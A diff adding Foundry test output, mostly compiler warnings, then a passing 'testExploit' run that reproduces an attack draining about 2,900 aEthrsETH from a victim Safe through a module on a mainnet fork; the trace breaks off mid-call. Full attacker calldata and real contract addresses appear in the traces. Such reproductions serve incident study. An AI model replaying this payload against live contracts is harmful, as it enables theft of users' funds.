@@ -1,0 +1,661 @@
+Compiling 20 files with Solc 0.8.35
+Solc 0.8.35 finished in 388.57ms
+Compiler run successful with warnings:
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/RsETHSafeModule_exp.sol:RsETHSafeModule_exp
+[PASS] testExploit() (gas: 786495)
+Logs:
+  victim Safe aEthrsETH (before): 53402.655157601774360853
+  aEthrsETH extracted from victim Safe: 2899.999999999997756821
+  victim Safe aEthrsETH (after): 50502.655157601776604032
+
+Traces:
+  [645871] RsETHSafeModule_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25980524 [2.598e7])
+    │   └─ ← [Return] 1
+    ├─ [604236] → new RsETHSafeModuleAttacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 3018 bytes of code
+    └─ ← [Stop]
+
+  [826295] RsETHSafeModule_exp::testExploit()
+    ├─ [7530] 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8::isModuleEnabled(0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca) [staticcall]
+    │   ├─ [2696] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::isModuleEnabled(0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca) [delegatecall]
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "module must be enabled on victim safe") [staticcall]
+    │   └─ ← [Return]
+    ├─ [23294] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   ├─ [18185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
+    │   │   ├─ [10378] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   ├─ [5326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   └─ ← [Return] 53402655157601774360853 [5.34e22]
+    │   └─ ← [Return] 53402655157601774360853 [5.34e22]
+    ├─ emit log_named_decimal_uint(key: "victim Safe aEthrsETH (before)", val: 53402655157601774360853 [5.34e22], decimals: 18)
+    ├─ [0] VM::assertGe(53402655157601774360853 [5.34e22], 2899999999999997756820 [2.899e21], "safe holds the collateral") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD], attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD])
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf4844814)
+    │   └─ ← [Return]
+    ├─ [37008] RsETHSafeModuleAttacker::exploitWithoutSelfRef(2899999999999997756820 [2.899e21])
+    │   ├─ [30402] 0x4f0055926c839D1d960a82CBF84E2eE933958ebC::multicall(0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca, [0x000000df000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000007d6daf1210ba68d361c9c9118336819f92d930f8623b32c0262ae1d1debdd64334b9c4da84090130f3007709667669db100f4f4cdf5e5ad039326864fde24e199f5b77140a4bfe9a646a3f5e5770946fe7ff8c369b448a288076fa5e73de6eaabe173e0989d1fe97382ce2a265eaec78f23edcba7c16e27837825544031e0e8a17f5333311acba216d67f0bb1d23a840a9363e58e2949fa7c0879e0e9c0cd79b369de1eedb776a1ae395ddc2f7ba4659e2bedf054797bfbe55356cc994f2c6bff25f9b7fc722163414485a68dcddbd1aceaec0c3441daf16edbd730b6bf81a322])
+    │   │   ├─ [22693] 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca::0000004f() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000045eec62717529295fc457271e1b1f7bfd24369e700000000000000000000000084513a7d34bdee906d6073bcbabec3bc97e71fb3000000000000000000000000853778e4a7d0827d94a313eef821894551eca00b000000000000000000000000814124bcec4a0c2d81279810287bb4c1f76d694800000000000000000000000025117f09cc4c28e74523d9c2ca4ca9713f0409020000000000000000000000009efa4021294860de01fdd259e96ee920c1ac47110000000000000000000000004f0055926c839d1d960a82cbf84e2ee933958ebc
+    │   │   └─ ← [Revert] custom error 0x7899fd73
+    │   └─ ← [Revert] custom error 0x7899fd73
+    ├─ [3794] 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [staticcall]
+    │   ├─ [3185] 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA::balanceOf(0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8) [delegatecall]
+    │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   └─ ← [Return] 53402655157601774360853 [5.34e22]
+    │   └─ ← [Return] 53402655157601774360853 [5.34e22]
+    ├─ [0] VM::assertEq(53402655157601774360853 [5.34e22], 53402655157601774360853 [5.34e22], "control changed nothing") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD], attackerEOA: [0x4AA2E86F6DeF408d1b5906FB5AE41E31E013f0CD])
+    │   └─ ← [Return]
+    ├─ [713450] RsETHSafeModuleAttacker::exploit(2899999999999997756820 [2.899e21])
+    │   ├─ [705139] 0x4f0055926c839D1d960a82CBF84E2eE933958ebC::multicall(0x4f0055926c839D1d960a82CBF84E2eE933958ebC, [0x00c25829000000000000000000000000ea18b13d11f705a68f0954f637949e1eaa7ac4ca00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004a4000000df000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000007d6daf1210ba68d361c9c9118336819f92d930f8623b32c0262ae1d1debdd64334b9c4da84090130f3007709667669db100f4f4cdf5e5ad039326864fde24e199f5b77140a4bfe9a646a3f5e5770946fe7ff8c369b448a288076fa5e73de6eaabe173e0989d1fe97382ce2a265eaec78f23edcba7c16e27837825544031e0e8a17f5333311acba216d67f0bb1d23a840a9363e58e2949fa7c0879e0e9c0cd79b369de1eedb776a1ae395ddc2f7ba4659e2bedf054797bfbe55356cc994f2c6bff25f9b7fc722163414485a68dcddbd1aceaec0c3441daf16edbd730b6bf81a32200000000000000000000000000000000000000000000000000000000])
+    │   │   ├─ [701618] 0x4f0055926c839D1d960a82CBF84E2eE933958ebC::multicall(0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca, [0x000000df000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003a00000000000000000000000000000000000000000000000000000000000000002620d97cf81000000000000ffdcdc4ef8c992e75bb0f300536cd93e601c8882ab00010203040506ffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000206f02d48a972733869d852f03bd281c6efddd4c06f4c82b384f000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc59400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000009d3595ab2438adc594000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000007d6daf1210ba68d361c9c9118336819f92d930f8623b32c0262ae1d1debdd64334b9c4da84090130f3007709667669db100f4f4cdf5e5ad039326864fde24e199f5b77140a4bfe9a646a3f5e5770946fe7ff8c369b448a288076fa5e73de6eaabe173e0989d1fe97382ce2a265eaec78f23edcba7c16e27837825544031e0e8a17f5333311acba216d67f0bb1d23a840a9363e58e2949fa7c0879e0e9c0cd79b369de1eedb776a1ae395ddc2f7ba4659e2bedf054797bfbe55356cc994f2c6bff25f9b7fc722163414485a68dcddbd1aceaec0c3441daf16edbd730b6bf81a322])
+    │   │   │   ├─ [22693] 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca::0000004f() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000700000000000000000000000045eec62717529295fc457271e1b1f7bfd24369e700000000000000000000000084513a7d34bdee906d6073bcbabec3bc97e71fb3000000000000000000000000853778e4a7d0827d94a313eef821894551eca00b000000000000000000000000814124bcec4a0c2d81279810287bb4c1f76d694800000000000000000000000025117f09cc4c28e74523d9c2ca4ca9713f0409020000000000000000000000009efa4021294860de01fdd259e96ee920c1ac47110000000000000000000000004f0055926c839d1d960a82cbf84e2ee933958ebc
+    │   │   │   ├─ [670325] 0xeA18B13d11f705a68F0954f637949e1eaA7AC4ca::unstake_39c37c(128)
